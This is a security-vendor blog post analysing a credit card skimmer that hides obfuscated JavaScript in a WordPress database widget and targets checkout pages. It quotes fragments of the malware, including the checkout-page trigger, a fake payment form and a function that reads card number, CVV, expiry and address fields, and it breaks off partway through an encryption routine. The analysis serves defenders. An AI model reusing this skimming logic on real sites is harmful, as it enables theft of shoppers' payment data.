---
title: Stealthy Credit Card Skimmer Targets WordPress Checkout Pages via Database Injection
url: https://blog.sucuri.net/2025/01/stealthy-credit-card-skimmer-targets-wordpress-checkout-pages-via-database-injection.html
source: Sucuri Blog
date: 2025-01-10
fetch_date: 2025-10-06T20:07:13.338910
---

# Stealthy Credit Card Skimmer Targets WordPress Checkout Pages via Database Injection

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Ecommerce Security](https://blog.sucuri.net/category/ecommerce-security)
* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Stealthy Credit Card Skimmer Targets WordPress Checkout Pages via Database Injection

[![](https://secure.gravatar.com/avatar/3bb7fb42c6bf04c758d570c2f6bb217266c127e77766dc9d8e6754f15cdd5867?s=60&d=mm&r=g)](https://blog.sucuri.net/author/puja-srivastava)

[Puja Srivastava](https://blog.sucuri.net/author/puja-srivastava)

* January 9, 2025

![Stealthy Credit Card Skimmer Targets WordPress Checkout Pages via Database Injection](https://blog.sucuri.net/wp-content/uploads/2025/01/Stealthy-Credit-Card-Skimmer-Targets-WordPress-Checkout-Pages-via-Database-Injection-820x385.png)

Recently, we released [an article](https://blog.sucuri.net/2024/11/credit-card-skimmer-malware-targeting-magento-checkout-pages.html) where a credit card skimmer was targeting checkout pages on a Magento site. Now we’ve come across sophisticated credit card skimmer malware while investigating a compromised WordPress website. This credit card skimmer malware targeting WordPress websites silently injects malicious JavaScript into database entries to steal sensitive payment details. The malware activates specifically on checkout pages, either by hijacking existing payment fields or injecting a fake credit card form.

![malicious javascript](https://blog.sucuri.net/wp-content/uploads/2025/01/malicious-javascript.png)

### Where was the malware found?

The malicious code was embedded in the WordPress database under the **wp\_options** table, specifically in the row:

option\_name: widget\_block
 option\_value: Contains obfuscated JavaScript code.

By injecting itself into the database rather than theme files or plugins, the malware avoids detection by common file-scanning tools. This allows it to persist quietly on compromised WordPress sites.

The malicious JavaScript was found injected into the HTML block widget through the WordPress admin panel (**wp-admin > widgets**).

![HTML block widget](https://blog.sucuri.net/wp-content/uploads/2025/01/html-block-widget-596x600.png)

### How does the malware work?

The script checks if the page URL contains “checkout” while excluding “cart.” This ensures the malware only activates when users are ready to submit their payment details.

```
const _0x232f96 = '/checkout';
if (window.location.toString().toLowerCase().search('' + _0x232f96) !== -1) {...}
```

It dynamically creates a fake payment form that mimics legitimate payment processors (e.g., Stripe). The form includes fields for credit card number, expiration date, CVV, and billing information. If a legitimate payment form is already on the page, the script captures data entered into these fields in real time.

```
const fakeForm = '<div id="stripe-payment-form-wrap">...</div>';
```

This approach ensures that users unknowingly provide their sensitive payment details to the attacker.

![sensitive data](https://blog.sucuri.net/wp-content/uploads/2025/01/sensitive-data.png)

As the visitor fills in their details, the malware captures the information in real time. In some cases, it hijacks existing payment fields on the page rather than creating a new form. This approach ensures compatibility with various payment systems.

```
 function _0x50efa4() {
        _0x5ab8c6.Number = document.getElementById(_0x3c48c0)
          ? document.getElementById(_0x3c48c0).value.replaceAll(' ', '')
          : ''
        _0x5ab8c6.CVV = document.getElementById(_0x4cbdac)
          ? document.getElementById(_0x4cbdac).value
          : ''
        _0x5ab8c6.Expiration = document.getElementById(_0x526fa8)
          ? document.getElementById(_0x526fa8).value
          : ''
        _0x5ab8c6.Address = document.getElementById(_0x72d8fc)
          ? document.getElementById(_0x72d8fc).value
          : ''
        _0x5ab8c6.FullName = document.getElementById(_0x37276b)
          ? document.getElementById(_0x37276b).value
          : ''
        _0x5ab8c6.City = document.getElementById(_0x4e4454)
          ? document.getElementById(_0x4e4454).value
          : ''
        _0x5ab8c6.Zip = document.getElementById(_0x31755f)
          ? document.getElementById(_0x31755f).value
          : ''
```

To obfuscate the stolen data, the malware uses Base64 encoding combined with AES-CBC encryption. This makes the data look harmless during transit and difficult to analyze.

```
async function _0x233872(_0x521845, _0x5e6977, _0xd6a8ef) {
        try {
          var _0x5180cb = Uint8Array.from(atob(_0x521845), (_0x47cd28) =>
              _0x47cd28.charCodeAt(0)
            ),
            _0x25deba = Uint8Array.from(atob(_0...